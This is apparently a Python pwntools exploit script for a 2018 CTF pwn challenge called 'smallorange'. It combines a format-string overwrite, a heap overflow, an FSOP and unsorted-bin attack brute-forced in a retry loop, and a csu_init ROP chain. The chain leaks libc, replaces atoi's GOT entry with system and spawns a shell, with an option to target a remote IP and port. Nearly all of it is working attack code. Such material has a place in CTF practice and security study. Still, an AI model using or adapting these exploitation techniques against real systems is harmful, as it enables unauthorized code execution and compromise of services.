'''http://myhackerworld.top/2018/12/26/%E5%AE%89%E6%81%92%E6%9D%AF12%E6%9C%88%E6%9C%88%E8%B5%9B-pwn/
1. overwrite read nbytes to enable heap overflow
2. overwrite low 2 bytes of unsorted_bin chunk, then 1/16 percentage to invoke fsop and unsorted_bin_attack to hijack control flow to edit, fake RDI to stack rbp
3. stack overflow and csu_init to leak read_got, and overwrite atoi_got
'''
from pwn import *
from FILE import *
context.log_level = 'debug'

elf = ELF('./smallorange')
write_got = elf.got['write']
print 'write_got= ' + hex(write_got)
read_got = elf.got['read']
print 'read_got= ' + hex(read_got)
atoi_got = elf.got['atoi']
print 'atoi_got= ' + hex(atoi_got)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def new(p, data):
	p.recvuntil('choice: ')
	p.sendline('1')
	p.recvuntil('text:\n')
	p.send(data)

def out(p, index):
	p.recvuntil('choice: ')
	p.sendline('2')
	p.recvuntil('index:\n')
	p.sendline(str(index))

def z(p, a=''):
	gdb.attach(p,a)
	if a == '':
		raw_input()
  
def fsop():
  local = 1
  if local:
    p = process('./smallorange')
    #p=process(['./babyheap'],env={'LD_PRELOAD':'./libc.so.6'},aslr='FALSE')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
  else:
    p = remote('120.132.85.170', 13579)
    libc = ELF('./libc.so.6')
  
  p.recvuntil('hahaha,come to hurt by ourselves\n')
  '''
  0x7ffd58b64340:	0x0000000000400cc8	0x00007ffd58b64380
  0x7ffd58b64350:	0x0000000000000000	0x0000002258b643c0
  0x7ffd58b64360:	0x00007ffd58b643c0	0x0000000000400977
  0x7ffd58b64370:	0x0000000000000000	0x00000000000000a0
  0x7ffd58b64380:	0x6161616161616161	0x6161616161616161
  0x7ffd58b64390:	0x6161616161616161	0x6161616161616161
  0x7ffd58b643a0:	0x6e24393125616161	0x00007ffd58b64379 #14 + 5
  '''
  p.send('a'*0x23+'%19$n') #overwrite v5 to 0x23A0
  p.recvuntil('a'*0x23)
  stack_v5_plus1 = u64(p.recv(6).ljust(8,'\0'))
  print 'stack_v5_plus1= ' + hex(stack_v5_plus1)
  
  p.recvuntil('heap addr:')
  data = p.recvuntil('\n', drop=True)
  heap_base = int(data, 16)
  print 'heap_base= ' + hex(heap_base)
  
  new(p, '0') # to overflow to chunk2, heap_base + 0x110
  new(p, '1') #heap_base + 0x220
  
  fake_file = '' #chunk header: _flags, _IO_read_ptr
  fake_file += p64(0) * 2 # _IO_read_end, _IO_read_base, heap_base+0x330
  fake_file += p64(0) + p64(1) # _IO_write_base, _IO_write_ptr
  edit_addr = 0x400B59
  fake_file += p64(edit_addr) #fake vtable->overflow, offset=3, so vtable should be heap_base+0x338
  fake_file = fake_file.ljust(0xd8 - 0x10, '\0') #_mode = 0
  fake_file += p64(heap_base+0x338)
  
  new(p, fake_file)
  new(p, '4')
  
  out(p, 0)
  out(p, 2)
  
  pay = '5' * 0x210
  '''
  stack_v5_plus1= 0x7fffffffdb39
  pwndbg> p $rbp
  $1 = (void *) 0x7fffffffd5f0
  '''
  pay += p64(stack_v5_plus1 - 0x7fffffffdb39 + 0x7fffffffd5f0) + p64(0x61) #overflow read buff in edit to stack rbp, and chunk2 size to 0x61
  pay += p64(0) + '\x10\x25' #modify low 2 byte as x510(x:0-f), turn off aslr, the base is: 0x7ffff7a0d000, so _IO_list_all-0x10 is: 0x7ffff7a0d000 + 0x3c5510 = 7FFFF7DD2510, low 2 byte is: 2510
  new(p, pay) #5=0
  
  p.recvuntil('choice: ')
  #z(p)
  p.sendline('1') #cause chunk2 to be put into smallbin, 1/16 percentage to invoke unsorted_bin_attack to overwrite _IO_list_all=unsorted_chunks(av)
  
  #if success would hijack to edit_addr, then use stack overflow and csu_init to leak puts_got, and overwrite atoi_got to system
  
  p.recvuntil("index:\n")
  p.sendline('0')
  
  pop_rbx_rbp_r12_r13_r14_r15 = 0x400C9A
  mov_mov_mov_call = 0x400C80
  pay = 'a'*8 + p64(pop_rbx_rbp_r12_r13_r14_r15)
  pay += p64(0) + p64(1) + p64(write_got) + p64(0x8) + p64(read_got) + p64(1) #write(1, read_got, 8)
  pay += p64(mov_mov_mov_call)
  pay += 'a'*8 + p64(0) + p64(1) + p64(read_got) + p64(0x8) + p64(atoi_got) + p64(0) #read(0, atoi_got, 8)
  getnum_addr = 0x4009AC
  pay += p64(mov_mov_mov_call) + 'a'*8*7 + p64(getnum_addr)
  p.send(pay)
  
  read_addr = u64(p.recv(8))
  print 'read_addr= ' + hex(read_addr)
  libc_base = read_addr - libc.symbols['read']
  print 'libc_base= ' + hex(libc_base)
  system_addr = libc_base + libc.symbols['system']
  
  p.send(p64(system_addr))
  p.recvuntil('choice: ')
  p.sendline('/bin/sh')
  p.interactive()


while True:
  try:
    fsop()
  except:
    pass

#fsop()